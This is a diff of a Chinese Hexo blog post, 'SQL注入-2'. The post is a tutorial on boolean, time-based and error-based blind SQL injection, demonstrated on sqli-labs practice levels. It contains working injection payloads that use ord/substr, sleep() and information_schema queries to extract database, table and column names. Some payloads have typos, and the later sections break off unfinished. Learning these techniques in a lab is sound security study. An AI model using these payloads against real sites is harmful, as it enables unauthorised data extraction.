@@ -4,31 +4,32 @@
   <meta charset="utf-8">
   
   
-  <title>SQL注入 | Hexo</title>
+  <title>SQL注入-2 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="布尔型注入盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。 布尔盲注1、布尔型盲注应用于无数据回显，且WEB页面无报错信息的情况，此时不能通过报错型注入的方法来爆出数据，布尔型盲注的WEB页面只有两种回显结果，正确的页面以及错误的页面，且错误的页面无报错提示语句，正确的页面不能输出数据。 实例是使用的sq">
+  <meta name="description" content="布尔型注入盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。 布尔盲注1、布尔型盲注应用于无数据回显，且WEB页面无报错信息的情况，此时不能通过报错型注入的方法来爆出数据，布尔型盲注的WEB页面只有两种回显结果，正确的页面以及错误的页面，且错误的页面无报错提示语句，正确的页面不能输出数据。 2.几种常用的函">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入">
-<meta property="og:url" content="http://example.com/2021/06/17/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="SQL注入-2">
+<meta property="og:url" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="布尔型注入盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。 布尔盲注1、布尔型盲注应用于无数据回显，且WEB页面无报错信息的情况，此时不能通过报错型注入的方法来爆出数据，布尔型盲注的WEB页面只有两种回显结果，正确的页面以及错误的页面，且错误的页面无报错提示语句，正确的页面不能输出数据。 实例是使用的sq">
+<meta property="og:description" content="布尔型注入盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。 布尔盲注1、布尔型盲注应用于无数据回显，且WEB页面无报错信息的情况，此时不能通过报错型注入的方法来爆出数据，布尔型盲注的WEB页面只有两种回显结果，正确的页面以及错误的页面，且错误的页面无报错提示语句，正确的页面不能输出数据。 2.几种常用的函">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="e:/CTF2021/sql1.png">
-<meta property="og:image" content="e:/CTF2021/sql2.png">
-<meta property="og:image" content="e:/CTF2021/sql3.png">
-<meta property="og:image" content="e:/CTF2021/sql4.png">
-<meta property="og:image" content="e:/CTF2021/sql5.png">
-<meta property="og:image" content="e:/CTF2021/8.png">
-<meta property="og:image" content="e:/CTF2021/9.png">
-<meta property="og:image" content="e:/CTF2021/10.png">
-<meta property="og:image" content="e:/CTF2021/11.png">
-<meta property="og:image" content="e:/CTF2021/12.png">
-<meta property="og:image" content="https://z3.ax1x.com/2021/06/21/RAmCEn.png">
-<meta property="article:published_time" content="2021-06-17T13:21:07.000Z">
-<meta property="article:modified_time" content="2021-06-21T04:49:49.578Z">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql1.png">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql2.png">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql4.png">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql5.png">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql6.png">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/8.png">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/9.png">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/11.png">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/10.png">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/biao.png">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/12.png">
+<meta property="og:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/13.png">
+<meta property="article:published_time" content="2021-06-21T07:22:40.000Z">
+<meta property="article:modified_time" content="2021-06-21T08:03:04.188Z">
 <meta property="article:author" content="wsoney">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="e:/CTF2021/sql1.png">
+<meta name="twitter:image" content="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql1.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -85,10 +86,10 @@
 </header>
 
       <div class="outer">
-        <section id="main"><article id="post-SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+        <section id="main"><article id="post-SQL注入-2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/06/17/SQL%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time class="dt-published" datetime="2021-06-17T13:21:07.000Z" itemprop="datePublished">2021-06-17</time>
+    <a href="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/" class="article-date">
+  <time class="dt-published" datetime="2021-06-21T07:22:40.000Z" itemprop="datePublished">2021-06-21</time>
 </a>
     
   </div>
@@ -99,7 +100,7 @@
         
   
     <h1 class="p-name article-title" itemprop="headline name">
-      SQL注入
+      SQL注入-2
     </h1>
   
 
@@ -109,55 +110,73 @@
       
         <h2 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h2><p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。</p>
 <h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>1、布尔型盲注应用于无数据回显，且WEB页面无报错信息的情况，此时不能通过报错型注入的方法来爆出数据，布尔型盲注的WEB页面只有两种回显结果，正确的页面以及错误的页面，且错误的页面无报错提示语句，正确的页面不能输出数据。</p>
-<p>实例是使用的sqli-labs  的第八关：</p>
-<p><img src="E:\CTF2021\sql1.png"></p>
-<p>get一个参数id = 1 会返回True的页面</p>
-<p><img src="E:\CTF2021\sql2.png"></p>
-<p><img src="E:\CTF2021\sql3.png"></p>
-<p>2.函数<br>盲注，其注入就是通过函数的执行结果来猜测数据</p>
+<p>2.<strong>几种常用的函数</strong><br>盲注，其注入就是通过函数的执行结果来猜测数据</p>
 <p><strong>Length()函数</strong>：<br>其功能为返回字符串的长度。例如：length(abc)返回3</p>
 <p><strong>Substr()函数</strong>：<br>其功能为截取字符串<br>例如：substr(abc,1,1):含义为从abc的第一位开始取数，步长为1，结果显示a</p>
 <p><strong>Mid()函数</strong><br>其功能为取出字符串的一部分值<br>例如：Mid(abc,1,1)：从abc的第一位开始取数，步长为1，与substr()函数用法一致，结果显示为a</p>
 <p><strong>Left()函数</strong><br>其功能为取出字符串左边的几个数据。<br>Left(abc,1):返回a       Left(abc,2):返回bc</p>
 <p><strong>Ord()与ASCII()函数</strong><br>其功能为返回一个字符的ASCII码值<br>ASCII(s):返回115</p>
 <p><strong>Hex()函数</strong><br>其功能为返回该数的十六进制形式。</p>
+<p>实例是使用的sqli-labs  的第八关：</p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql1.png" alt="sql1"></p>
+<p>get一个参数id = 1 会返回True的页面</p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql2.png" alt="sql2"></p>
 <p>3、本实例需要我们先测其闭合方式：</p>
 <p>id = 1’ and 1=1 –+:</p>
-<p><img src="E:\CTF2021\sql4.png"></p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql4.png" alt="sql4"></p>
 <p>id = 1’ and 1 = 2 –+:</p>
-<p><img src="E:\CTF2021\sql5.png"></p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql5.png" alt="sql5"></p>
 <p>可见其为单引号闭合。</p>
 <p>利用id = 1’ order by 10 –+   id = 1’ order by 5 –+</p>
 <p>id = 1’ order by 3 –+:可以试出来其列表为3列。</p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/sql6.png" alt="sql6"></p>
 <p>求其数据库名</p>
 <p>id = 1’ and length(database())&gt;7 –+  有回显：</p>
-<p><img src="E:\CTF2021\8.png"></p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/8.png" alt="8"></p>
 <p>id = 1’ and length(database()) &gt; 8–+没有回显：可判断其库名的长度为8</p>
-<p><img src="E:\CTF2021\9.png"></p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/9.png" alt="9"></p>
 <p>查询数据库的第一个字符首字母：</p>
 <p>id = 1’id=1’and ord(substr(database(),1,1))&gt;114 –+  True;  </p>
-<p><img src="E:\CTF2021\10.png"></p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/11.png" alt="11"></p>
 <p>id=1’and ord(substr(database(),1,1))&gt;115 –+            False</p>
-<p><img src="E:\CTF2021\11.png"></p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/10.png" alt="10"></p>
 <p>可判断其首字母为s且为小写。修改其为id = 1’id=1’and ord(substr(database(),2,1))&gt;114 –+</p>
 <p>可查询第二个字母。最后可得到为security。</p>
+<p>同样也可以通过下面的语句来查询其表的长度： </p>
+<p>?id=1’and length((select table_name from information_schema.tables where table_schema=‘security’ limit 0,1))&gt;5 –+</p>
+<p>通过ASCII码值查询表名：</p>
+<p>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))&gt;114  –+</p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/biao.png" alt="biao"></p>
+<p>查询列名：</p>
+<p>id =1‘ and ascii（substr（（select column_name from information_schema. columns w~here TABLE_name = ‘your table’ and table_schema = ‘security’ limit 0,1），1，1））&gt;1 </p>
+<p>这个没有实操</p>
+<p>总之通过布尔盲注就是通过不断地试错，通过猜来得到你想要的信息，过程比较复杂。</p>
+<p>可以结合着python脚本来进行，会更方便快捷。这里以后会写一个的。</p>
 <h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>​       时间型的注入遇到的条件更为苛刻，数据交互完成以后目标网站<strong>没有错误和正确的页面回显</strong>，这种情况我们可以利用<strong>时间函数</strong>来判断数据有没有在目标数据中得到执行。需要设置正确的时间延迟。</p>
 <p>函数   除其他盲注函数外    时间盲注的核心函数：sleep()。同时可以利用if判断函数结合。</p>
 <p>本次实例为sqli -labs第九关。</p>
-<p>?id=1’and if(1=2,1,sleep(2)) –+：可见在等待了两秒后输出</p>
-<p><img src="E:\CTF2021\12.png"></p>
+<p>?id=1’and if(1=2,1,sleep(2)) –+：可见页面在等待了两秒后输出</p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/12.png" alt="12"></p>
 <p>?id=1’and if(length((select database()))=8,sleep(2),0) –+  ：</p>
 <p>同样也可以通过此语句来判断</p>
 <p>如果当前数据库名的长度为8的话则立即输出，如果不为8则延迟2s输出。</p>
 <p>?id=1’and if(ascii(substr((select database()),1,1))&gt;114,sleep(2),0)  –+</p>
 <p>同样可以通过其ASCII码值来判断其首字母。</p>
-<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/RAmCEn"><img src="https://z3.ax1x.com/2021/06/21/RAmCEn.png" alt="RAmCEn.png"></a></p>
-<p>布尔盲注和时间盲注在语法和使用条件上是十分相像的。只是要求其产生的回显反馈不同。</p>
+<p><img src="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/13.png" alt="13"></p>
+<p>布尔盲注和时间盲注在语使用条件上和一些必要的函数使用上是十分相像的。只是要求其产生的回显反馈不同。在这里就不赘述了，以后遇到太大的不同的话会补充的。</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><strong>概念</strong></p>
+<p>利用报错的信息来回显我们想要查询的信息</p>
+<p>**过程 **</p>
+<p>1、找到注入点，是否有报错信息（利用条件）<br>2、使用updatexml()函数  ：</p>
+<p>updatexml(XML_document(string格式，为XML文档对象的名称）,XPATH_string,new_value（替换查找道德符合条件的数据）)</p>
+<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p><strong>概念</strong></p>
+<p>在我们进行sql注入的时候，有时候information_schema这个库可能会因为过滤而无法调用，这时我们就不能通过这个库来查出表名和列名。我们可以使用一些方法来查出表名，但有时候这种方法也无法查到列名，这时我们就要用到无列名注入了。无列名注入，顾名思义，就是不需要列名就能注出数据的注入。</p>
+<p><strong>原理</strong></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/17/SQL%E6%B3%A8%E5%85%A5/" data-id="ckq654a770000f8vi93z96q63" data-title="SQL注入" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/" data-id="ckq6c1fqp000048vi77alc18j" data-title="SQL注入-2" class="article-share-link">Share</a>
       
       
       
@@ -208,7 +227,7 @@
       <ul>
         
           <li>
-            <a href="/2021/06/17/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+            <a href="/2021/06/21/SQL%E6%B3%A8%E5%85%A5-2/">SQL注入-2</a>
           </li>
         
           <li>
